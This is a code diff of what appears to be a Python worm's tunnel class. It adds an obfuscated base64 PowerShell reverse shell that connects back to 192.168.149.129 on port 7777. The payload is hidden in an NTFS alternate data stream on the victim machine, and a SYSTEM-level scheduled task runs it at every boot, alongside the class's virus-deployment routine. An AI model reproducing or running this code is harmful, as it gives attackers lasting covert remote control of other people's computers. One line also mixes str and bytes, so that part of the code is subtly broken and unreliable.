@@ -24,11 +24,11 @@ class tunnel(threading.Thread):
         
         osplatform = "windows"
         if osplatform == "windows":
-            dir = "%temp%"
+            dir = "C:/Users/Public/Documents"
         else:
             dir = "/tmp/"
         self.deploy_virus(self.worm.getfiledata(),conn, osplatform, dir)
-        #self.create_persistence(conn, dir)
+        self.create_persistence_windows(conn, dir)
         conn.close()
     
     
@@ -88,27 +88,44 @@ class tunnel(threading.Thread):
         else:
             return ""
 
-    def create_persistence(self, conn, dir):
+    def generate_base64_reverse_shell_code(self, ostype:str):
+        print("Create a reverse Shell on Port 7777")
+        if ostype == "windows":
+            reverse_shell = ""
+            reverse_shell += "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0"
+            reverse_shell += "AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADEANAA5AC4AMQAyADkAJwAsADcANwA3ADcAKQA7ACQA"
+            reverse_shell += "cwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAk"
+            reverse_shell += "AGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQA"
+            reverse_shell += "cgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAt"
+            reverse_shell += "AG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAA"
+            reverse_shell += "UwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAk"
+            reverse_shell += "AGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIA"
+            reverse_shell += "PgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABi"
+            reverse_shell += "AGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQA"
+            reverse_shell += "YgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0"
+            reverse_shell += "AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQA"
+            reverse_shell += "ZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9"
+            reverse_shell += "ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+            return reverse_shell
+        elif ostype == "linux":
+            return ""
+        else:
+            return ""
+    def create_persistence_windows(self, conn, dir,filename="hello.txt"):
         #creating a backdoor access on the remote server
-        command = b"powershell -encodedcommand "
-        command += self.generate_base64_bind_shell_code("windows").encode()
-        command+=b"\n"
-        self.sent_command(command,conn)
-        print("Create a Bind Shell on Port 7777")
-        print(self.get_response(conn,8192))
-
-        command = 'Set-Content -path "{}/remain.tmp:hidden" -Value "'.format(dir).encode()
-        command += self.generate_base64_bind_shell_code("windows").encode()
+        command = 'Set-Content -path "{}/{}:hidden" -Value "'.format(dir,filename).encode()
+        command += self.generate_base64_reverse_shell_code("windows").encode()
         command += b'"'
         command+=b"\n"
         self.sent_command(command,conn)
-        print("Store Base64 Bind Shell in Temp Folder")
-        print(self.get_response(conn,8192))
+        print("Store Base64 Shell in {} Folder".format(dir))
+        time.sleep(8)
+        print(self.get_response(conn,4096))
         
-        command = 'schtasks /create /tn "reminderr" /tr "powershell -Command \"$command=get-content $env:\\temp:hidden; powershell -encodedcommand $command\"" /sc onstart'
+        command = 'schtasks /create /tn "reminderr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "powershell -Command \"$command=get-content {}/{}:hidden; powershell -encodedcommand $command\""'.format(dir,filename)
         command+=b"\n"
         self.sent_command(command,conn)
-        print("Create a Schedule Tasks to Start the Bind Shell on Boot")
+        print("Create a Schedule Tasks to Start the reverse Shell on Boot")
         print(self.get_response(conn,1024))
     
     def deploy_virus(self, data, conn, ostype="windows", dir=""):
